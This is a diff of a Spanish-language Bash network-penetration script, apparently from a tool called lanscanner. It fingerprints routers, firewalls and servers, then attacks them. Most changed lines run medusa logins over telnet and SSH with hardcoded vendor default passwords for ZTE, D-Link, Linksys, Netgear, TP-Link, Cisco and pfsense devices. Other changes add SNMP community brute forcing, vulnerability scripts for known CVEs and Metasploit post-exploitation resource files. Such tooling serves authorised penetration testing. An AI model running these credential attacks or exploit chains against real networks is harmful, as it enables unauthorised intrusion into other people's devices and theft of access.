-			sub3=${Array[$array_len - 1]} # com ó bo
-	
-			if [[ ${sub3} == "bo" ]] && [[ "$sub2" == "com" || "$sub2" == "org" || "$sub2" == "gob" || "$sub2" == "edu" ]];then
-				sub1=${Array[$array_len - 3]}"." # dominio
-			fi				        		
-
-			dominio=$sub1$sub2.$sub3
-			echo -e "\t[+] Dominio = $dominio"	
-						
-			
 			### zone transfer ###			
-			zone_transfer=`dig -tAXFR @$ip $dominio`
+			zone_transfer=`dig -tAXFR @$ip $DOMAIN`
 			echo "dig -tAXFR @$ip $dominio" > logs/vulnerabilidades/$ip-53-transferenciaDNS.txt 
 			echo $zone_transfer >> logs/vulnerabilidades/$ip-53-transferenciaDNS.txt 
 			if [[ ${zone_transfer} != *"failed"*  && ${zone_transfer} != *"timed out"* && ${zone_transfer} != *"error"* ]];then
@@ -2596,8 +2596,7 @@ then
 			
 			#open resolver
 			echo -e "\t [+] Probando si es un servidor DNS openresolver"
-			dig ANY google.com @$ip +short | grep --color=never google > .vulnerabilidades/$ip-53-openresolver.txt 2>/dev/null &														
-		fi					
+			dig ANY google.com @$ip +short | grep --color=never google > .vulnerabilidades/$ip-53-openresolver.txt 2>/dev/null &																
 		
 	done
 	
@@ -2684,6 +2683,7 @@ getBanners.pl -l .datos/total-host-vivos.txt -t .nmap/nmap-tcp.grep
 	sort ../.servicios/MikroTik2.txt | sort | uniq > ../.servicios/MikroTik.txt; rm ../.servicios/MikroTik2.txt
 	
 	grep -i "d-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/d-link2.txt
+	grep -i "Dropbear sshd" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ubiquiti2.txt
 	grep -i "forti" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/fortinet2.txt
 	grep -i "3com" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/3com2.txt
 	grep -i "linksys" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/linksys2.txt
@@ -2707,8 +2707,8 @@ getBanners.pl -l .datos/total-host-vivos.txt -t .nmap/nmap-tcp.grep
 	grep --color=never -i admin *webarchivos.txt 2>/dev/null| grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt
 	
 	#tomcat
-	grep --color=never -i "/manager/html" * 2>/dev/null| grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt
-	
+	grep --color=never -i "/manager/html" * 2>/dev/null| grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt	
+		
 	
 	#fortinet
 	grep --color=never -i forti * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/fortinet2.txt
@@ -2731,8 +2731,13 @@ getBanners.pl -l .datos/total-host-vivos.txt -t .nmap/nmap-tcp.grep
 	rm ../.servicios/linksys2.txt
 		
 	
+	#Pentahoo	
+	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
+	grep --color=never -i pentaho * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" > ../.servicios/pentaho.txt
+	
 	#ubiquiti
-	grep --color=never -i ubiquiti * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/ubiquiti.txt
+	grep --color=never -i ubiquiti * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/ubiquiti2.txt	
+	sort ../.servicios/ubiquiti2.txt | uniq > ../.servicios/ubiquiti.txt ; rm ../.servicios/ubiquiti2.txt
 	
 	#pfsense
 	grep --color=never -i pfsense * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/pfsense.txt
@@ -2745,8 +2750,7 @@ getBanners.pl -l .datos/total-host-vivos.txt -t .nmap/nmap-tcp.grep
 	
 	#ZTE
 	grep --color=never -i ZTE * 2>/dev/null | sort | cut -d "-" -f1 | uniq | tr "-" ":" >> ../.servicios/ZTE2.txt
-	sort ../.servicios/ZTE2.txt | uniq > ../.servicios/ZTE.txt 
-	rm ../.servicios/ZTE2.txt
+	sort ../.servicios/ZTE2.txt | uniq > ../.servicios/ZTE.txt ; rm ../.servicios/ZTE2.txt
 		
 	
 	#zimbra
@@ -2771,10 +2775,8 @@ find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
 if [ -f .servicios/upnp.txt ]
 then
 	echo -e "$OKBLUE #################### UPnP (`wc -l .servicios/upnp.txt`) ######################$RESET"
-	for line in $(cat .servicios/upnp.txt); do
-		ip=`echo $line | cut -f1 -d":"`
-		port=`echo $line | cut -f2 -d":"`		
-		echo -e "[+] Escaneando $ip:$port"		
+	for ip in $(cat .servicios/upnp.txt); do		
+		echo -e "[+] Escaneando $ip:1900"		
 		upnp_info.py $ip  >> logs/vulnerabilidades/$ip-upnp-enum.txt 2>/dev/null &					
 	done
 	
@@ -2792,10 +2794,7 @@ then
 	done	# done true		
 	
 	# Revisar si se detecto servicios upnp
-	for line in $(cat .servicios/upnp.txt); do
-		ip=`echo $line | cut -f1 -d":"`
-		port=`echo $line | cut -f2 -d":"`		
-		
+	for ip in $(cat .servicios/upnp.txt); do			
 					
 		egrep -iq "http" logs/vulnerabilidades/$ip-upnp-enum.txt
 		greprc=$?
@@ -2838,7 +2837,7 @@ then
 		echo -e "[+] Escaneando $ip:443"		
 		echo "nmap -n -Pn  -p 443 --script http-vuln-cve2014-2128 $ip" > logs/vulnerabilidades/$ip-cisco-vuln.txt 2>/dev/null		
 		nmap -n -Pn  -p 443 --script http-vuln-cve2014-2128 $ip >> logs/vulnerabilidades/$ip-cisco-vuln.txt 2>/dev/null		
-		grep "|" logs/vulnerabilidades/$ip-cisco-vuln.txt  > .vulnerabilidades/$ip-cisco-vuln.txt
+		grep "|" logs/vulnerabilidades/$ip-cisco-vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-cisco-vuln.txt
 		
 #		nmap -n -Pn  -p 443 --script http-vuln-cve2014-2129 $ip > logs/vulnerabilidades/$ip-cisco-dos.txt 2>/dev/null		
 		#grep "|" logs/vulnerabilidades/$ip-cisco-dos.txt  > .vulnerabilidades/$ip-cisco-dos.txt
@@ -2861,7 +2860,7 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
-			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-cisco.txt 2>/dev/null			
+			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-cisco.txt 2>/dev/null
 		fi		
 
 		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
@@ -2888,7 +2887,7 @@ then
 		echo -e "[+] Escaneando $ip:445"		
 		echo "nmap -n -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip" > logs/vulnerabilidades/$ip-samba-vuln.txt 2>/dev/null
 		nmap -n -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip >> logs/vulnerabilidades/$ip-samba-vuln.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/$ip-samba-vuln.txt  > .vulnerabilidades/$ip-samba-vuln.txt
+		grep "|" logs/vulnerabilidades/$ip-samba-vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-samba-vuln.txt
 		#scanner/smb/smb_uninit_cred											 
 		 echo ""
  	done <.servicios/samba.txt
@@ -3160,7 +3159,7 @@ then
 			medusa -h $ip -u admin -p pfsense -M ssh >> logs/vulnerabilidades/$ip-admin-pfsense.txt 2>/dev/null			
 		fi					
 				
-		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-pfsense.txt > .vulnerabilidades/$ip-pfsense-passwordDefecto.txt
+		grep --color=never SUCCESS logs/vulnerabilidades/$ip-22-pfsense.txt > .vulnerabilidades/$ip-22-passwordDefecto.txt
 		echo ""
  	done <.servicios/pfsense.txt	
 	insert_data
@@ -3201,9 +3200,10 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
-			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
-			medusa -h $ip -u admin -p 1234 -M telnet >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null			
-			medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
+			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u admin -p 1234 -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
+			medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-23-passwordDefecto.txt > .vulnerabilidades/$ip-23-passwordDefecto.txt
 			
 		fi		
 
@@ -3211,12 +3211,13 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
-			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
-			medusa -h $ip -u admin -p 1234 -M ssh >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
-			medusa -e n -u admin -h $ip -M ssh >> logs/vulnerabilidades/$ip-admin-Netgear.txt 2>/dev/null
+			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u admin -p 1234 -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -e n -u admin -h $ip -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-22-passwordDefecto.txt > .vulnerabilidades/$ip-22-passwordDefecto.txt
 		fi					
 				
-		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-Netgear.txt > .vulnerabilidades/$ip-netgear-passwordDefecto.txt
+		
 		echo ""
  	done <.servicios/Netgear.txt	
 	insert_data
@@ -3235,10 +3236,11 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
-			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null
-			medusa -h $ip -u admin -p password -M telnet >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null			
-			medusa -h $ip -u root -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null			
-			medusa -e n -u linksys -h $ip -M telnet >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null
+			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u admin -p password -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u root -p admin -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
+			medusa -e n -u linksys -h $ip -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-23-passwordDefecto.txt > .vulnerabilidades/$ip-23-passwordDefecto.txt
 			
 		fi		
 
@@ -3246,13 +3248,13 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
-			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null
-			medusa -h $ip -u admin -p password -M ssh >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null			
-			medusa -h $ip -u root -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null			
-			medusa -e n -u linksys -h $ip -M ssh >> logs/vulnerabilidades/$ip-admin-linksys.txt 2>/dev/null
+			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u admin -p password -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u root -p admin -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null			
+			medusa -e n -u linksys -h $ip -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-22-passwordDefecto.txt > .vulnerabilidades/$ip-22-passwordDefecto.txt
 		fi					
-				
-		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-linksys.txt > .vulnerabilidades/$ip-linksys-passwordDefecto.txt
+						
 		echo ""
  	done <.servicios/linksys.txt	
 	insert_data
@@ -3272,10 +3274,11 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
-			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
-			medusa -h $ip -u 1234 -p 1234 -M telnet >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
-			medusa -h $ip -u root -p 12345 -M telnet >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
-			medusa -h $ip -u root -p root -M telnet >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
+			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u 1234 -p 1234 -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u root -p 12345 -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u root -p root -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-23-passwordDefecto.txt > .vulnerabilidades/$ip-23-passwordDefecto.txt
 			
 		fi		
 
@@ -3283,13 +3286,13 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
-			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
-			medusa -h $ip -u 1234 -p 1234 -M ssh >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
-			medusa -h $ip -u root -p 12345 -M ssh >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
-			medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/$ip-admin-dlink.txt 2>/dev/null			
+			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u 1234 -p 1234 -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u root -p 12345 -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null			
 		fi					
 				
-		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-dlink.txt > .vulnerabilidades/$ip-dlink-passwordDefecto.txt
+		grep --color=never SUCCESS logs/vulnerabilidades/$ip-22-passwordDefecto.txt > .vulnerabilidades/$ip-22-passwordDefecto.txt
 		echo ""
  	done <.servicios/d-link.txt	
 	insert_data
@@ -3309,7 +3312,8 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
-			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-tplink:23-passwordDefecto.txt 2>/dev/null			
+			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-23-passwordDefecto.txt > .vulnerabilidades/$ip-23-passwordDefecto.txt
 			
 		fi		
 
@@ -3317,10 +3321,10 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
-			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-tplink.txt 2>/dev/null			
+			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null			
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-22-passwordDefecto.txt > .vulnerabilidades/$ip-22-passwordDefecto.txt
 		fi					
-				
-		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-tplink.txt > .vulnerabilidades/$ip-tplink:22-passwordDefecto.txt
+						
 		echo ""
  	done <.servicios/tp-link.txt	
 	insert_data
@@ -3339,33 +3343,32 @@ then
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
-			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u zte -p zte -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u ZXDSL -p ZXDSL -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u user -p user -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u on -p on -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u root -p Zte521 -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u root -p 'W!n0&oO7.' -M telnet >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
+			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u zte -p zte -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u ZXDSL -p ZXDSL -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u user -p user -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u on -p on -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u root -p Zte521 -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u root -p 'W!n0&oO7.' -M telnet >> logs/vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null
 			
-			grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-ZTE.txt > .vulnerabilidades/$ip-23-passwordDefecto.txt 2>dev/null			
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-23-ZTE.txt > .vulnerabilidades/$ip-23-passwordDefecto.txt 2>/dev/null			
 		fi
 		#exploit 
-		#sendcmd 1 DB p DevAuthInfo			
+		#sendcmd 1 DB p DevAuthInfo
 
 		egrep -iq "22/open" .nmap_1000p/$ip-tcp.grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
-			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u zte -p zte -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u ZXDSL -p ZXDSL -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u user -p user -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u on -p on -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u root -p Zte521 -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			medusa -h $ip -u root -p 'W!n0&oO7.' -M ssh >> logs/vulnerabilidades/$ip-admin-ZTE.txt 2>/dev/null
-			
-			grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-ZTE.txt > .vulnerabilidades/$ip-admin-ZTE.txt 2>dev/null
-			cp logs/vulnerabilidades/$ip-admin-ZTE.txt .vulnerabilidades/$ip-zte:22-passwordDefecto.txt
+			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u zte -p zte -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u ZXDSL -p ZXDSL -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u user -p user -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u on -p on -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u root -p Zte521 -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			medusa -h $ip -u root -p 'W!n0&oO7.' -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+			grep --color=never SUCCESS logs/vulnerabilidades/$ip-22-passwordDefecto.txt > .vulnerabilidades/$ip-22-passwordDefecto.txt 2>dev/null
+		
 		fi
 		#exploit 
 		#sendcmd 1 DB p DevAuthInfo	
@@ -3376,8 +3379,8 @@ then
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando HTTP \n $RESET"	
 			echo "user" > pass.txt
-			passWeb.pl -t $ip -p 80 -d / -m zte -u user -f pass.txt  > logs/vulnerabilidades/$ip-web-ZTE.txt 2>/dev/null
-			grep "Password encontrado" logs/vulnerabilidades/$ip-web-ZTE.txt > .vulnerabilidades/$ip-zte:80-passwordDefecto.txt 2>/dev/null
+			passWeb.pl -t $ip -p 80 -d / -m zte -u user -f pass.txt  > logs/vulnerabilidades/$ip-80-passwordDefecto.txt 2>/dev/null
+			grep "Password encontrado" logs/vulnerabilidades/$ip-80-passwordDefecto.txt > .vulnerabilidades/$ip-80-passwordDefecto.txt 2>/dev/null
 		fi					
 						
 		echo ""
@@ -3419,7 +3422,7 @@ then
 			snmpbrute.py -t $ip --windows --auto >> logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt 2>/dev/null 
 		fi									
 			
-		if [[ (${device} == *"linux"* || ${device} == *"Linux"* ) && (${device} != *"linux host"* )]];then 
+		if [[ (${device} == *"linux"* || ${device} == *"Ubuntu"*  || ${device} == *"Linux"* ) && (${device} != *"linux host"* )]];then 
 			echo -e "\t\t[+] Enumerando como dispositivo Linux" 
 			snmpbrute.py -t $ip --linux --auto >> logs/vulnerabilidades/$ip-snmp-snmpCommunity.txt 2>/dev/null 
 		fi										
@@ -3456,6 +3459,8 @@ fi
 
 echo "spool `pwd`/metasploit/IP-creds.txt" > command-metasploit.txt
 echo "resource /usr/share/lanscanner/postExploiter/creds.rc" >> command-metasploit.txt
+echo "setg SESSION X" >> command-metasploit.txt
+echo "resource /usr/share/lanscanner/postExploiter/enum.rc" >> command-metasploit.txt
 
 echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
 grep -ira "timed out" * logs/enumeracion/* 2>/dev/null
